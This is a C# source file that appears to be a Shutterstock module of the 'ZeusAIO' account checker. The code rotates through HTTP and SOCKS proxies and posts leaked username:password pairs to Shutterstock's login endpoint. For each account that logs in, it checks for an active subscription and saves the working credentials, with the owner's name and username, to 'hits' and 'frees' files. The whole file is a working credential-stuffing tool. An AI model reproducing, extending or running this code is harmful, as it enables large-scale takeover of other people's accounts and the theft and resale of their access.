using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Shuttershock
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("accept", "application/json");
                            req.AddHeader("accept-encoding", "gzip, deflate, br");
                            req.AddHeader("accept-language", "en-US,en;q=0.9");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36");

                            var res0 = req.Get("https://www.shutterstock.com/sstk/authorize-urls?urls=authenticated");
                            string text0 = res0.ToString();

                            var url = Functions.LR(text0, "{\"authorizeUrls\":[\"", "\"]}").FirstOrDefault();
                            req.AddHeader("accept", "application/json");
                            req.AddHeader("accept-encoding", "gzip, deflate, br");
                            req.AddHeader("accept-language", "en-US,en;q=0.9");
                            req.AddHeader("origin", "https://www.shutterstock.com");
                            req.AddHeader("referer", "https://www.shutterstock.com/");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-site");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36");

                            var res1 = req.Post("https://accounts.shutterstock.com/login", "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"next\":\"" + url + "\",\"g-recaptcha-response\":null}", "application/json");
                            string text1 = res1.ToString();
                            if (text1.Contains("This account has been disable") || text1.Contains("USER_IS_DISABLED"))
                            {
                                break;
                            }
                           else  if (text1.Contains("{\"ok\":true"))
                            {
                                var Username = Functions.LR(text1, ",\"username\":\"", "\",\"").FirstOrDefault();
                                var First = Functions.LR(text1, ",\"first_name\":", ",\"").FirstOrDefault();
                                var Last = Functions.LR(text1, "last_name\":", ",\"").FirstOrDefault();
                                var Name = "" + First + " " + Last + "";
                                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");

                                var res2 = req.Get("https://www.shutterstock.com/account/plans");
                                string text2 = res2.ToString();

                                if (text2.Contains("No active plans"))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - SHUTTERSHOCK] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Shuttershock_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    var Plan = "Active";
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - SHUTTERSHOCK] " + s[0] + ":" + s[1] + " | Plan: " + Plan + " | Name: " + Name + " | Username: " + Username, Color.Green);
                                    }
                                    Export.AsResult("/Shuttershock_hits", s[0] + ":" + s[1] + " | Plan: " + Plan + " | Name: " + Name + " | Username: " + Username);
                                    ZeusAIO.mainmenu.hits++;
                                    return false;
                                }


                            }
                            else if (text1.Contains("User is required to reset their password"))
                            {
                                ZeusAIO.mainmenu.frees++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[FREE - SHUTTERSHOCK] " + s[0] + ":" + s[1], Color.OrangeRed);
                                }
                                Export.AsResult("/Shuttershock_frees", s[0] + ":" + s[1]);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}